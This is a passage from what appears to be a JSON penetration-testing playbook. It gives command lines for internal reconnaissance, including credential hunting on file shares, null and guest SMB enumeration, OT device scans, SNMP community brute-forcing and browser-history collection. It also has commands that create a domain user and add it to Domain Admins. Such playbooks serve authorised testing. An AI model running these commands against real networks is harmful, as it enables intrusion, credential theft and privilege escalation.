                "description": "Analyze public IP records to identify ranges owned by the target organization. Use sources such as WHOIS or ARIN to gather ownership details.",
                "requirements": {},
                "results": [
                    "IP RANGES:IDENTIFIED"
                ]
            },
            {
                "id": "1b6b1039-e5aa-4a3c-96f9-718615b9e34b",
                "name": "Map Services to IP Ranges",
                "description": "Associate identified IP ranges with services and infrastructure. Check for hosting, email, or network services mapped to specific ranges.",
                "requirements": {},
                "results": [
                    "IP RANGES:SERVICES:MAPPED"
                ]
            },
            {
                "id": "206cf4ca-aa50-43f4-ab50-a9ebe2ff3302",
                "name": "Validate Active Hosts in IP Ranges",
                "description": "Probe the identified ranges to validate active hosts and services. Review exposed ports, protocols, and banners for relevance to the target.",
                "requirements": {},
                "results": [
                    "IP RANGES:HOSTS:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "6984151a-bbdb-43a5-a33f-47743b1352ce",
        "name": "Credentials Search",
        "phase": "02. Reconnaissance",
        "ttp": "T1087",
        "external": false,
        "description": "Find credentials within knowledge bases or shares",
        "content": "\n## [[MANSPIDER]]\nSearch the network for filenames that may contain creds\n>manspider 192.168.0.0/24 -f passw user admin account network login logon cred -d evilcorp -u admin -p password\n\nSearch for XLSX files containing \"password\"\n>manspider share.evil.corp -c password -e xlsx -d evilcorp -u admin -p password\n\nSearch for interesting file extensions\n> manspider share.evil.corp -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config -d evilcorp -u admin -p password",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Manspider",
            "Snaffler",
            "TruffleHog",
            "LaZagne",
            "Credential Finder",
            "Forensics Credential Harvester"
        ],
        "steps": [
            {
                "id": "3fe73341-2aef-4fc4-ad32-9fca5cbb2f07",
                "name": "Locate Potential Credential Files",
                "description": "Search for files with names or extensions indicative of credentials, such as '.key', '.conf', or containing 'password'. Focus on shared drives, public folders, or exposed repositories.",
                "requirements": {},
                "results": [
                    "CREDENTIALS:FILES:LOCATED"
                ]
            },
            {
                "id": "643282fb-204d-43c8-ad94-cb913c4a5db6",
                "name": "Extract Credentials from Files",
                "description": "Analyze the content of identified files for plaintext or encoded credentials. Look for patterns such as 'username:password' or API tokens.",
                "requirements": {},
                "results": [
                    "CREDENTIALS:EXTRACTED"
                ]
            },
            {
                "id": "1ec08063-b86f-4e77-9ad6-3de7ae622fb5",
                "name": "Correlate Credentials with Services",
                "description": "Match extracted credentials with known services or accounts to identify valid combinations. Prioritize high-value targets such as admin or service accounts.",
                "requirements": {},
                "results": [
                    "CREDENTIALS:SERVICES:CORRELATED"
                ]
            }
        ]
    },
    {
        "id": "fc9c6492-13d1-42e0-b483-055a76a7c6a1",
        "name": "Find Mail Server",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find mail server within a network",
        "content": "# Tools\n########\n\n########\n\n## [[Nslookup]]\nFind exchange server via nslookup  \n`nslookup -q=MX <domain>`\n`nslookup _tcp._autodiscover.domain.com`  \n`nslookup autodiscover.domain.com`  \n`nslookup mail.domain.com`  \n`nslookup email.domain.com`  \n`nslookup owa.domain.com`  \n`nslookup securemail.domain.com`\n\n## [[ruler]]\n[[Phishing]] [[Internal Phishing]]",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "ruler",
            "Nslookup"
        ],
        "steps": [
            {
                "id": "bcc6f4a7-0d3a-442b-91a6-0d3fbfb0991e",
                "name": "Query MX Records",
                "description": "Perform DNS lookups to retrieve MX records associated with the target domain. Identify mail servers responsible for handling email for the domain.",
                "requirements": {},
                "results": [
                    "MAIL SERVER:MX RECORDS:QUERIED"
                ]
            },
            {
                "id": "81507f23-ad46-4fbf-af9a-25c75b5f2f4a",
                "name": "Probe Common Email Services",
                "description": "Attempt connections to standard email service endpoints (e.g., autodiscover.<domain>, mail.<domain>). Check for services such as Microsoft Exchange or Zimbra.",
                "requirements": {},
                "results": [
                    "MAIL SERVER:SERVICES:PROBED"
                ]
            },
            {
                "id": "f31a017f-a1df-4917-9b8d-349392b36834",
                "name": "Validate Mail Server Functionality",
                "description": "Test mail server responses by initiating a handshake (e.g., EHLO commands). Ensure that the server is operational and configured correctly.",
                "requirements": {},
                "results": [
                    "MAIL SERVER:FUNCTIONALITY:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "215975da-84ae-4b96-bab6-4a9d0b027878",
        "name": "Find Web Server",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find web server within a network",
        "content": "# Tools\n########\n\n########\n\n## [[EyeWitness]]\nLocal Scan (does not work)\n>./EyeWitness.py --localscan 192.168.1.0/24\n\nScan with multiple IPs received from NMAP\n```sh\ncat /root/targets.txt\n10.10.17.71\n10.10.1.20\n10.10.17.68\n\nproxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/edu --no-dns --no-prompt\n\nStarting Web Requests (3 Hosts)\nAttempting to screenshot http://10.10.17.71\n[*] WebDriverError when connecting to http://10.10.17.71\nAttempting to screenshot http://10.10.1.20\n[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.1.20:80  ...  OK\nAttempting to screenshot http://10.10.17.68\n[*] WebDriverError when connecting to http://10.10.17.68\nFinished in 12.967030048370361 seconds\n```\n\n## [[GoWitness]]\nScan internal network\n* Screenshot a single website  \n> gowitness single https://www.google.com/\n* Screenshot a cidr using 20 threads  \n> gowitness scan --cidr 192.168.0.0/24 --threads 20\n* Scan based on Nessus scan\n> .\\gowitness-2.4.0-windows-amd64.exe nessus -f .\\ScanniSceneroni_xm6g2a.nessus\n* Scan based on URL/IP file\n> .\\gowitness-2.4.0-windows-amd64.exe file -f '.\\External Pentesting\\urls.txt'\n* Screenshot open http services from an namp file  \n> gowitness nmap -f nmap.xml --open --service-contains http\n* Run the report server  \n> gowitness report serve",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "GoWitness",
            "EyeWitness"
        ],
        "steps": [
            {
                "id": "6116f40f-f845-4dee-9db7-15f494cc330a",
                "name": "Scan for HTTP and HTTPS Services",
                "description": "Probe the target network for HTTP/HTTPS services using common ports (80, 443). Identify active web servers and enumerate their versions.",
                "requirements": {},
                "results": [
                    "WEB SERVER:SERVICES:SCANNED"
                ]
            },
            {
                "id": "3f2b99c6-e790-41c0-b126-45df504a2d13",
                "name": "Analyze HTTP Headers",
                "description": "Inspect HTTP headers for details such as server types, versions, and configurations. Look for clues about underlying technologies or misconfigurations.",
                "requirements": {},
                "results": [
                    "WEB SERVER:HEADERS:ANALYZED"
                ]
            },
            {
                "id": "b4f10619-2bee-4e41-9dd7-6bd3b39f0800",
                "name": "Validate Web Server Accessibility",
                "description": "Attempt to access identified web servers through browsers or command-line tools. Confirm that the services are reachable and functioning as expected.",
                "requirements": {},
                "results": [
                    "WEB SERVER:ACCESSIBILITY:VALIDATED"
                ]
            },
            {
                "id": "7c68214c-b36c-4bbd-91a6-90c32f3615ed",
                "name": "Capture Web Server Screenshots",
                "description": "Generate screenshots of identified web servers to visually inspect their interfaces. Focus on login pages, error messages, or exposed internal dashboards for further analysis.",
                "requirements": {},
                "results": [
                    "WEB SERVER:SCREENSHOTS:CAPTURED"
                ]
            }
        ]
    },
    {
        "id": "1fa59a9a-65a1-42bc-ae2f-ba08dbac3488",
        "name": "Guest Access (SMB)",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Find SMB with guest access enabled",
        "content": "# Find guest access (SMB)\n\n## Tools\n########\n########\n\n## [[crackmapexec]]\nEnumerate null sessions\n>cme smb <ip> -u '' -p ''  \n\nEnumerate Anonymous access\n>cme smb <ip> -u 'a' -p ''\n\n## [[enum4linux]]\n> enum4linux -a -u \"\" -p \"\" <dc-ip>  \n> enum4linux -a -z \"guest\" -o \" <dc-ip>\n\n## [[smbclient]]\n[[Shares]]\n* `smbclient -U '%' -L //<dc-ip>`\n* `smbclient -U 'guest%' -L //<dc-ip>`\n\n## [[smbmap]]\n* `smbmap -u \"\" -p \"\" -P 445 -H <dc-ip>`\n* `smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip>`",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "smbclient",
            "enum4linux",
            "smbmap",
            "crackmapexec"
        ],
        "steps": [
            {
                "id": "d3f9d210-0eb2-4aa7-8655-5989ae5b333e",
                "name": "Identify SMB Shares with Guest Access",
                "description": "Enumerate SMB shares on the target network to identify those accessible without authentication. Focus on shares commonly misconfigured with guest access.",
                "requirements": {},
                "results": [
                    "SMB:SHARES:IDENTIFIED"
                ]
            },
            {
                "id": "12b0285c-b9cc-4ba5-a474-85a6a9706601",
                "name": "Access Identified SMB Shares",
                "description": "Attempt to access the identified SMB shares using null or guest credentials. List directory contents and validate accessibility.",
                "requirements": {},
                "results": [
                    "SMB:SHARES:ACCESSED"
                ]
            },
            {
                "id": "ffbe7067-7e62-43f0-a233-a9aba8870622",
                "name": "Analyze Shared Content",
                "description": "Inspect the files and directories within accessible shares. Search for sensitive information such as configurations, credentials, or logs.",
                "requirements": {},
                "results": [
                    "SMB:SHARES:ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "56591923-a935-4f2f-8f79-ae33f8cb50df",
        "name": "OT Devices",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Identify common OT devices",
        "content": "## Tools\n########\n########\n\n## [[NMAP]]\n> .\\nmap.exe -p- --script=s7-info,modbus-discover,bacnet-info,enip-info,Siemens-CommunicationsProcessor.nse,Siemens-HMI-miniweb.nse,Siemens-Scalance-module.nse,Siemens-SIMATIC-PLC-S7.nse,Siemens-WINCC.nse 172.29.137.100",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "NMAP"
        ],
        "steps": [
            {
                "id": "a19880a9-c38a-44ab-b123-807018d48a21",
                "name": "Perform Passive Network Sniffing",
                "description": "Capture and analyze network traffic passively to identify OT devices. Look for common OT protocol signatures such as Modbus, BACnet, or Siemens S7 without actively probing the network.",
                "requirements": {},
                "results": [
                    "OT DEVICES:TRAFFIC:PASSIVELY ANALYZED"
                ]
            },
            {
                "id": "80c6834a-8339-4cb4-b90b-3e09a9269bc7",
                "name": "Scan for Common OT Protocols",
                "description": "If allowed or systems can handle the load, perform active network scans to identify devices communicating over protocols such as Modbus, BACnet, or Siemens S7. Focus on ports commonly associated with these protocols.",
                "requirements": {},
                "results": [
                    "OT DEVICES:PROTOCOLS:SCANNED"
                ]
            },
            {
                "id": "7dafbb96-02cb-43e2-be1a-6dba0f5882fa",
                "name": "Enumerate OT Device Information",
                "description": "If allowed, query identified OT devices for device details such as manufacturer, model, and firmware version. Use standard queries supported by the protocols.",
                "requirements": {},
                "results": [
                    "OT DEVICES:DETAILS:ENUMERATED"
                ]
            },
            {
                "id": "79754097-d560-4505-8b88-a0ede16d2533",
                "name": "Validate Device Communication",
                "description": "Establish communication with identified OT devices to validate their responsiveness. Ensure proper handling of commands or queries.",
                "requirements": {},
                "results": [
                    "OT DEVICES:COMMUNICATION:VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "340acfa4-5d20-4539-ab58-b1548a3b108a",
        "name": "Shares",
        "phase": "02. Reconnaissance",
        "ttp": "T1083",
        "external": false,
        "description": "Identify hosts with smb running on the network",
        "content": "\n## [[crackmapexec]]\n* Enumerate smb hosts  \n>cme smb <ip_range>\n\n## [[mmc]]\n[[Logged In Users]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Shared Folders\n\n## [[PowerView]]\n### Identify Shares\n\n`Find-DomainShare` will find SMB shares in a domain and `-CheckShareAccess` will only display those that the executing principal has access to. via [[PowerView]]\n\n```powershell\nFind-DomainShare -CheckShareAccess\n\nName           Type Remark              ComputerName\n----           ---- ------              ------------\nsoftware          0                     dc-2.edu.evil.corp\n```",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "PowerView",
            "smbclient",
            "crackmapexec"
        ],
        "steps": [
            {
                "id": "3d7745c8-61cb-49ba-82eb-839747b617da",
                "name": "Enumerate SMB Hosts",
                "description": "Identify SMB hosts on the network by scanning for active hosts with port 445 open. Note the hostnames, IPs, and service availability.",
                "requirements": {},
                "results": [
                    "SHARES:HOSTS IDENTIFIED"
                ]
            },
            {
                "id": "5bc31594-cc06-4352-8c0a-ab5422d851cf",
                "name": "List Available Shares",
                "description": "Query identified SMB hosts to list available shares. Focus on shares that allow anonymous or guest access.",
                "requirements": {},
                "results": [
                    "SHARES:LISTED"
                ]
            },
            {
                "id": "bd12a825-bc95-475a-ab5e-f2f5438a4fa5",
                "name": "Validate Share Accessibility",
                "description": "Attempt to access listed shares using different credentials or anonymously. Verify if any sensitive information is stored in accessible directories.",
                "requirements": {},
                "results": [
                    "SHARES:ACCESS VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "3149289a-f245-40a0-8612-0433b0f41781",
        "name": "SMB Signing",
        "phase": "02. Reconnaissance",
        "ttp": "T1000",
        "external": false,
        "description": "Is SMB signing enabled",
        "content": "# SMB Signing\n\n## Metasploit\n* `use exploit/windows/smb/smb_relay`\n\n## Tools\n########\n########\n\n## [[crackmapexec]]\nChecking for SMB signing\n\n## [[NMAP]]\n> nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "NMAP",
            "crackmapexec"
        ],
        "steps": [
            {
                "id": "ca866d03-23ad-4682-bbd2-64d7887abe7a",
                "name": "Identify SMB Signing Configuration",
                "description": "Check the SMB signing configuration on target systems to determine if it is enabled or required. Look for indicators of weak or missing configurations.",
                "requirements": {},
                "results": [
                    "SMB SIGNING:CONFIGURATION IDENTIFIED"
                ]
            },
            {
                "id": "a8fc4e4a-405b-4bcb-8e2c-4998d90ea1c7",
                "name": "Test SMB Signing Enforcement",
                "description": "Attempt SMB connections to the target system to validate whether SMB signing is enforced. Log the results for misconfigured systems.",
                "requirements": {},
                "results": [
                    "SMB SIGNING:ENFORCEMENT TESTED"
                ]
            },
            {
                "id": "1efb44e0-de6b-4c9c-8486-aeac8be969b4",
                "name": "Document Vulnerable Systems",
                "description": "Document systems with missing or weak SMB signing configurations. Prioritize high-value systems for follow-up actions.",
                "requirements": {},
                "results": [
                    "SMB SIGNING:VULNERABLE SYSTEMS DOCUMENTED"
                ]
            }
        ]
    },
    {
        "id": "b316363c-92cc-43ab-a78d-54d1971c3746",
        "name": "User enum",
        "phase": "02. Reconnaissance",
        "ttp": "T1087",
        "external": false,
        "description": "Find users",
        "content": "\n## [[crackmapexec]]\n>cme smb <ip> -u <user> -p '<password>' --users\n\n## [[enum4linux]]\n> enum4linux -U <dc-ip> | grep 'user:'\n\n## [[ldapsearch]]\n> ldapsearch -x -h <ip> -s base\n\n## [[NMAP]]\n> nmap -n -sV --script \"ldap* an not brute\" -p 389 <dc-ip>\n\n## [[rpcclient]]\nEnumerate users present on a system\n```\nproxychains rpcclient 10.0.1.10 -U testuser -P pw\nenumdomusers\n```\n\nEnumerate the user\n`queryuser testuser`\n\n\nEnumerate the current users privs\n`enumprivs`",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "NMAP",
            "ldapsearch",
            "crackmapexec",
            "rpcclient",
            "enum4linux"
        ],
        "steps": [
            {
                "id": "b257e7e3-d37a-4aa8-ad70-413cbe6a3443",
                "name": "Query User Accounts via LDAP",
                "description": "Leverage LDAP queries to list user accounts in the target domain. Focus on details such as account names, roles, and last login times.",
                "requirements": {},
                "results": [
                    "USER ENUM:LDAP QUERIED"
                ]
            },
            {
                "id": "e8618bf4-04a6-4b5b-81e3-d881f8eb51ac",
                "name": "Enumerate Users via SMB",
                "description": "Attempt to list domain users by connecting to SMB services. Check for additional details like password policies or account privileges.",
                "requirements": {},
                "results": [
                    "USER ENUM:SMB ENUMERATED"
                ]
            },
            {
                "id": "735ca4aa-0a0d-4dd1-be24-37206caa8ebc",
                "name": "Inspect User Privileges",
                "description": "Validate the privileges of identified accounts, focusing on admin or service accounts. Look for misconfigurations or elevated permissions.",
                "requirements": {},
                "results": [
                    "USER ENUM:PRIVILEGES INSPECTED"
                ]
            },
            {
                "id": "6becad17-8552-4056-b16f-81ca784e87cc",
                "name": "Enumerate Local User Accounts",
                "description": "Query local user accounts on individual machines using native commands or system APIs. Focus on accounts with administrative privileges or those used by service processes.",
                "requirements": {},
                "results": [
                    "USER ENUM:LOCAL ACCOUNTS ENUMERATED"
                ]
            }
        ]
    },
    {
        "id": "72938e82-6c59-4cc9-bad0-96609d5f5362",
        "name": "Identify Machines",
        "phase": "02. Reconnaissance",
        "ttp": "T1595.001",
        "external": false,
        "description": "Identify services within the network",
        "content": "# Exposed Machines \n\nUse [[NMAP]] in order to detect the following services\n\n* Database Server\n* Email Server\n* SSH Server\n* VPN Server\n* Web Server\n\n## Tools\n########\n########\n\n## [[nbtscan]]\nScans the whole 192.168.1.0/24 network:\n> nbtscan -r 192.168.1.0/24\nScans a range from 192.168.1.25 to 192.168.1.137:\n> nbtscan 192.168.1.25-137\nScans C-class network. Prints results in script-friendly format using colon as field separator:\n> nbtscan -v -s : 192.168.1.0/24\nScans the whole 192.168.1.0/24 subnet, list all names received from each host (-v), print human-readable service names (-h):\n> nbtscan -h -v 192.168.1.0/24\n\n## [[PowerUpSQL]]\n## Discovery\n- `Get-SQLInstanceDomain`\n  Searching for SPNs that begin with `MSSQL*`\n- `Get-SQLInstanceBroadcast` \n- `Get-SQLInstanceScanUDP`\n- [[BloodHound#Database Server]]\n\n```ps\nGet-SQLInstanceDomain\n\nComputerName     : srv1.edu.evil.corp\nInstance         : srv1.edu.evil.corp,1433\nDomainAccountSid : 150000[ ...snip... ]172110400\nDomainAccount    : svc_mssql\nDomainAccountCn  : MS SQL Service\nService          : MSSQLSvc\nSpn              : MSSQLSvc/srv1.edu.evil.corp:1433\nLastLogon        : 5/14/2022 2:24 PM\nDescription      :\n```\n\n## Auto information gathering\n```ps\nGet-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n```\n\n## Test Login\n```ps\nGet-SQLConnectionTest -Instance \"srv1.edu.evil.corp,1433\" | fl\n\nComputerName : srv1.edu.evil.corp\nInstance     : srv1.edu.evil.corp,1433\nStatus       : Accessible\n```\n\n## Gather information\n```ps\nGet-SQLServerInfo -Instance \"srv1.edu.evil.corp,1433\"\n\nComputerName           : srv1.edu.evil.corp\nInstance               : SRV1\nDomainName             : EDU\nServiceProcessID       : 3960\nServiceName            : MSSQLSERVER\nServiceAccount         : EDU\\svc_mssql\nAuthenticationMode     : Windows Authentication\nForcedEncryption       : 0\nClustered              : No\nSQLServerVersionNumber : 13.0.5026.0\nSQLServerMajorVersion  : 2019\nSQLServerEdition       : Standard Edition (64-bit)\nSQLServerServicePack   : SP2\nOSArchitecture         : X64\nOsMachineType          : ServerNT\nOSVersionName          : Windows Server 2016 Datacenter\nOsVersionNumber        : SQL\nCurrentlogin           : EDU\\john\nIsSysadmin             : Yes\nActiveSessions         : 1\n```\n\n## SQL Query\n```ps\nGet-SQLQuery -Instance \"srv1.edu.evil.corp,1433\" -Query \"select @@servername\"\n\nColumn1\n-------\nSRV1\n```\n\n## [[snmpwalk]]\nUses snmp-getnext requests to enumerate a network device for their tree information. An object identified (OID) can be provided and from there all information below will be queried. If no OID is being provided, snmpwalk will start at the subtree rooted at SNMPv2-SMI::mib-2.\n\n![](/Images/Tools/d2e354a3-b1dc-40fa-bb6f-323dea9713de.png)\n\nIf the OID is being displayed as follows\n\n![](/Images/Tools/549ed8bc-0f8d-4d5a-89b0-df8cbff60ca3.png)\n\nensure to install the _snmp-mibs-downloader_ and commend the 4th line in /etc/snmp/snmp.conf.\n\nExample to query installed programs:\n\n![](/Images/Tools/0de1da34-6198-4529-90d3-40d89d6bccbd.png)\n\nsnmpset - modify\n----------------\n\nSNMPset is using the _set_ request to set or change information on the network entity. It allows managing the device.\n\nThe minimum requirement for this tool is a valid _OID_, a _type_ (integer, string), and a _value_. The following command changed the _sysContact_ key.\n\n![](/Images/Tools/31682251-2c70-48eb-9587-abadd7f63da0.png)\n![](/Images/Tools/8af26abc-4c3d-4ee2-9349-0895906829d6.png)\n\nAll available types are listed below:\n\n![](/Images/Tools/a9790eba-1da7-4a28-b942-3083cc4e36d7.png)\n\nYou can find NMAP scripts for SNMP as follows:\n\n```bash\nls /usr/share/nmap/scripts | grep -i snmp\n```\n\nThe above-mentioned process enumeration can also be done with the following NMAP script\n\n```java\nsudo nmap -sU -p 161 --scripts=snmp-win32-services 192.168.1.1\n```\n\nCommunity string bruteforce\n\n```bash\nsudo apt install seclists\nsudo nmap -sU -p 161 --scripts=snmp-brute --script-args=snmp.brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt 192.168.1.1\n```",
        "category": "Internal Reconnaissance",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerUpSQL",
            "nbtscan",
            "snmpwalk"
        ],
        "steps": [
            {
                "id": "e799250c-b1d4-467c-9f7b-fb73f7eaf440",
                "name": "Discover Active Hosts on Network",
                "description": "Perform network discovery to identify active hosts within the target range. Focus on systems with open ports and active services.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:HOSTS DISCOVERED"
                ]
            },
            {
                "id": "11596a25-69d2-447b-a142-b19f52a3b485",
                "name": "Enumerate Services on Hosts",
                "description": "List services running on discovered hosts, prioritizing HTTP, database, and email services. Analyze open ports for service banners.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:SERVICES ENUMERATED"
                ]
            },
            {
                "id": "fbf3aceb-4b08-454a-8bf3-78069dbf5d96",
                "name": "Validate Host Accessibility",
                "description": "Attempt to connect to identified services to confirm their responsiveness. Log details such as response times and service behaviors.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:ACCESS VALIDATED"
                ]
            },
            {
                "id": "4054a3fd-e193-4ffb-83c2-dcf87ab2eca3",
                "name": "Map Network Topology",
                "description": "Use passive analysis or active discovery to create a network topology map. Identify key nodes, gateways, and isolated segments for prioritization.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:TOPOLOGY MAPPED"
                ]
            },
            {
                "id": "1f2efa12-0894-4a2f-90e5-a31238a73f2c",
                "name": "Analyze Hostnames and DNS Entries",
                "description": "Query DNS or network directory services for hostnames associated with identified IPs. Cross-reference with discovered hosts to gather context.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:HOSTNAMES RESOLVED"
                ]
            },
            {
                "id": "adf44ca7-fcc6-4ab8-9cc2-f6ae89ac7471",
                "name": "Detect and Correlate Device Roles",
                "description": "Analyze service banners and system responses to infer device roles (e.g., servers, workstations, printers). Focus on identifying critical assets.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:ROLES DETERMINED"
                ]
            },
            {
                "id": "698c267d-2cc0-4d2b-90ad-ea0b65f9ff8e",
                "name": "Assess Host Vulnerabilities",
                "description": "Conduct vulnerability assessments on identified hosts using open ports and service details. Ensure to keep actions within allowed boundaries.",
                "requirements": {},
                "results": [
                    "IDENTIFY MACHINES:VULNERABILITIES ASSESSED"
                ]
            }
        ]
    },
    {
        "id": "20d2d952-3da5-4ad9-ab3d-273e2ffbd3e4",
        "name": "Bookmarks-History",
        "phase": "03. Host Enumeration",
        "ttp": "T1005",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
        "content": "# Bookmarks-History\n\n1. Download the history/bookmark files from the following filepaths\n2. Use this tool to read the history: [BrowsingHistoryView 64-bit](https://www.nirsoft.net/utils/browsinghistoryview-x64.zip)\n   \n## Chrome\nLocation of Google Chrome history\n### Windows\n`C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default`\n`C:\\Users\\<username>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache`\n### macOS\n`/Users/<username>/Library/Application Support/Google/Chrome/Default`\n`/Users/<username>/Library/Caches/Google/Chrome/Default/Cache`\n### Linux\n`/home/<username>/.config/google-chrome/Default`\n`/home/<username>/.cache/google-chrome/Default/Cache`\n\n## Firefox\n### Windows\n`C:\\Users\\<username>\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\<profile folder>`\n`C:\\Users\\<username>\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\<profile folder>\\cache2`\n### macOS\n`/Users/<username>/Library/Application Support/Firefox/Profiles/<profile folder>`\n`/Users/<username>/Library/Caches/Firefox/Profiles/<profile folder>/cache2`\n### Linux\n`/home/<username>/.mozilla/firefox/<profile folder>`\n`/home/<username>/.cache/mozilla/firefox/<profile folder>/cache2`\n\n## Tools\n########\n########\n\n## [[Get-BrowserData]]\n```ps\n.PARAMETER Browser\n    The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'\n.PARAMETER Datatype\n    Type of data to enumerate, 'History' or 'Bookmarks'\n.PARAMETER UserName\n    Specific username to search browser information for.\n.PARAMETER Search\n    Term to search for\n\nExample:\nEnumerates bookmarks for Internet Explorer for the user 'user1' and only returns results matching the search term 'github'.\n\nGet-BrowserData -Browser All -Datatype History -UserName user1 -Search 'github'\n\n\n```",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "Get-BrowserData"
        ],
        "steps": [
            {
                "id": "4a5261a4-7a21-4b92-8921-52cc5079415b",
                "name": "Locate Browser Data Files",
                "description": "Identify and locate browser-specific data files (e.g., history and bookmarks) on the target system. Focus on directories such as `%APPDATA%`, `/Library/Application Support`, or `.config`.",
                "requirements": {},
                "results": [
                    "BOOKMARKS-HISTORY:FILES LOCATED"
                ]
            },
            {
                "id": "7e970b5d-e611-44bb-943f-593eb6c6b031",
                "name": "Extract Browsing History and Bookmarks",
                "description": "Parse the identified browser data files to extract browsing history and bookmarked URLs. Prioritize entries that indicate internal knowledgebases or sensitive systems.",
                "requirements": {},
                "results": [
                    "BOOKMARKS-HISTORY:DATA EXTRACTED"
                ]
            },
            {
                "id": "cc1d19cf-23f7-45cb-83b9-997dd6c2c048",
                "name": "Analyze Extracted URLs",
                "description": "Review the extracted URLs for patterns, frequently visited sites, and potential internal systems. Document findings for further exploration.",
                "requirements": {},
                "results": [
                    "BOOKMARKS-HISTORY:URLS ANALYZED"
                ]
            }
        ]
    },
    {
        "id": "971dde7b-5a4c-4b8e-908e-8e619591c959",
        "name": "Common Language Runtime (CLR) Versions",
        "phase": "03. Host Enumeration",
        "ttp": "T1000",
        "external": false,
        "description": "Gather information about internal knowledgebases or target systems by reading the browsers history and bookmarks.",
        "content": "\n## [[PowerShell]]\n```ps\ndir %WINDIR%\\Microsoft.Net\\Framework\\ /s /b | find \"System.dll\"\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll\")\n\n[System.IO.File]::Exists(\"$env:windir\\Microsoft.Net\\Framework\\v4.0.30319 System.dll\")\n```",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "PowerShell"
        ],
        "steps": [
            {
                "id": "8c4bcc70-bfd4-4260-a5c7-cce4ecdc2c83",
                "name": "Identify CLR Installations",
                "description": "Search for directories or files indicating installed CLR versions, such as `System.dll`. Focus on standard installation paths under `%WINDIR%\\Microsoft.Net\\Framework`.",
                "requirements": {},
                "results": [
                    "CLR VERSIONS:INSTALLATIONS IDENTIFIED"
                ]
            },
            {
                "id": "f14d53a1-7428-4c66-9107-652b311b3462",
                "name": "Enumerate Installed CLR Versions",
                "description": "Parse identified directories to list installed CLR versions. Log version details such as major, minor, and build numbers.",
                "requirements": {},
                "results": [
                    "CLR VERSIONS:ENUMERATED"
                ]
            },
            {
                "id": "4c805ea1-ce23-4c32-a08e-c78be8e05714",
                "name": "Validate CLR Compatibility",
                "description": "Test compatibility of identified CLR versions with custom tools or scripts. Ensure the environment supports the intended operations.",
                "requirements": {},
                "results": [
                    "CLR VERSIONS:COMPATIBILITY VALIDATED"
                ]
            }
        ]
    },
    {
        "id": "c7bf893c-5d7c-4177-9a5a-5a8828672770",
        "name": "Local User+Groups",
        "phase": "03. Host Enumeration",
        "ttp": "T1069.001",
        "external": false,
        "description": "Identify local groups",
        "content": "## Tools\n########\n########\n\n## [[mmc]]\nLaunch mmc.exe, click File > Add\\remove snap-in > Local users and Groups\n\n## [[Net]]\n1. Create User:\n    '''bash\n    net user Patrick patrick12345! /ADD /DOMAIN\n    '''\n2. List local / domain groups\n    '''bash\n    net group /domain\n\n    Gruppenkonten f\u00fcr \\\\dc1.testdomain.local\n    -------------------------------------------------------------------------------\n    *$7O...\n    *Abteilung_....\n    *Dom\u00e4nen-Admins\n    \n    net localgroup [group (Remote Dektop Users)]\n    '''\n1. Add User to domain /local group\n    '''sh\n    net group \"Dom\u00e4nen-Admins\" Patrick /add /domain\n\n    net localgroup \"Remote Desktop Users\" Patrick /add\n    net localgroup \"Administrators\" Patrick /add\n    '''\n\n## [[wmic]]\nGet local user accounts\n'''cmd\nwmic useraccount list\n'''",
        "category": "",
        "stealthy": false,
        "changes": [],
        "tools": [
            "mmc",
            "Net",
            "wmic"
        ],
        "steps": [
            {
                "id": "bb8df5e7-96c3-4943-9eb1-69f9cfbba4fc",
                "name": "Enumerate Local User Accounts",
                "description": "Query the local system to list all user accounts. Focus on accounts with administrative privileges or those with unexpected activity.",
                "requirements": {},
                "results": [
                    "LOCAL USER+GROUPS:USERS ENUMERATED"
                ]
            },
            {
                "id": "95f353d9-2349-44a0-9516-a772375219d5",
                "name": "Enumerate Local Groups",
